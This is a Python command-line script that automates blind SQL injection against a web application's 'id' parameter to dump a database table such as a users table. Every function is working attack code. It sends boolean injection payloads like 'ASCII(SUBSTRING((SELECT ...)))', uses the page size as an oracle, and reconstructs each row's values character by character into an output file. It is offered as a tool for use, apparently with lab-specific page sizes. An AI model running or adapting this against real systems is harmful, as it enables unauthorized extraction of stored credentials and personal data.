"""
Python 3 Script to run a Blind SQL Injection over Users Table.
Author: Jose Antonio Garrido.
Date: 27/11/2021
Version: 1.0
"""
from argparse import ArgumentParser
import requests

# Define the size of error website
errorWebSize = 1551
# Define the size of news page index 1
okWebSize = 1467
# Define start Ascii table
startAsciiTable = 33
# Define end Ascii table
endAsciiTable = 122

def dir_path(file):
    """
    Parameters
    ----------
    file:
        content of the text file to write the output

    Return
    ------
    open file to write output
    """
    # Return an open file handle
    return open(file, 'w')

def getTotalRow(urlBase: str, tableName: str):
    """
    Parameters
    ----------
    urlBase:
        input http url to do Blind SQL injection
    tableName:
        input table name

    Return
    ------
    Total numbers of row in a table
    """
    rowLen = 0

    while True:
        query = '1 AND (SELECT Count(*) FROM {table})={size}'.format(
            table = tableName,
            size = rowLen
        )
        payload = {'id': query}
        response = requests.get(urlBase, params=payload)

        if (len(response.content) == okWebSize):
            break

        # Increment length if to get the total number of row
        rowLen+=1

    return rowLen

def getSizeElement(urlBase: str, tableName: str, columnName: str, rowIndex):
    """
    Parameters
    ----------
    urlBase:
        input http url to do Blind SQL injection
    tableName:
        input table name
    columnName:
        input column name
    rowIndex:
        input index of row

    Return
    ------
    Size of the element
    """
    elementSize = 0

    while True:
        query = '1 AND (SELECT length({column}) FROM {table} LIMIT 1 OFFSET {rowid})={size}'.format(
            column = columnName,
            table = tableName,
            rowid = rowIndex,
            size = elementSize
        )
        payload = {'id': query}
        response = requests.get(urlBase, params=payload)

        if (len(response.content) == okWebSize):
            break

        # Increment length to get the total size of the current element
        elementSize += 1

    return elementSize

def constructResult(dataAscii, rowIndex, column, accumulateTable):
    """
    Parameters
    ----------
    dataAscii:
        input list with the charactarers found
    rowIndex:
        input index of the row
    column:
        input column name
    accumulateTable:
        input accumulate table
    """
    # Convert ASCII to Symbol
    dataSymbol = ''.join(chr(i) for i in dataAscii)
    print("(id={rowId}) (column={columnName}) => ({data})".format(rowId=rowIndex, columnName=column, data=dataSymbol))
    info_row = {"id": rowIndex , column: dataSymbol}
    # Append to global dictionary
    accumulateTable.append(info_row)

def writeResult(result, filename):
    """
    Parameters
    ----------
    result:
        input dictionary with the datas result
    filename:
        input file to write result
    """
    filename.write(str(result))

def blindScript(urlBase: str, tableName: str, columnName: list, filename):
    """
    Parameters
    ----------
    urlBase: str
        input base url
    tableName : str
        input table name to get the content datas
    columnName : list
        input columns name to get the content datas
    filename: file
        input file to write the outputs datas
    """
    # Get the total number of columns
    accumulateTable = []
    lenColumns = len(columnName)
    rowLen = getTotalRow(urlBase, tableName)

    for ci in range(lenColumns):
        column = columnName[ci]
        for ri in range(rowLen):
            data = []
            dataLen = getSizeElement(urlBase, tableName, column, ri)
            for chi in range(1, dataLen + 1):
                for asciiValue in range(startAsciiTable, endAsciiTable + 1):
                    query = '1 AND ASCII(SUBSTRING((SELECT {name} FROM {table} LIMIT 1 OFFSET {row_index}),{char_index},1))={char_value}'.format(
                        name = column,
                        table = tableName,
                        row_index = ri,
                        char_index = chi,
                        char_value = asciiValue
                    )
                    payload = {'id': query}
                    response = requests.get(urlBase, params=payload)

                    if (len(response.content) == okWebSize):
                        data.append(asciiValue)
                        break

            # Build result response
            constructResult(data, ri, column, accumulateTable)

    # Print response result of table content into a file
    writeResult(accumulateTable, filename)

def main():
    # Read data from inputs
    parser = ArgumentParser(description='Blind SQLi Script v1.0 by Josan Garrido')
    parser.add_argument('-u', dest='urlBase', required=True, help='url web application')
    parser.add_argument('-t', dest='tableName' , required=True, help='table name of data base')
    parser.add_argument('-c', dest='columnName',required=True, help='list of column name in a table',type=str)
    parser.add_argument('-o', dest='filename', required=True, help='path to output file',metavar='FILE', type=lambda file: dir_path(file))
    args = parser.parse_args()

    urlBase = args.urlBase
    tableName = args.tableName
    columnName = args.columnName
    filename = args.filename

    columnName = columnName.split(',')
    blindScript(urlBase, tableName, columnName, filename)

    return 0

if __name__ == "__main__":
    #execute only if run as a script
    main()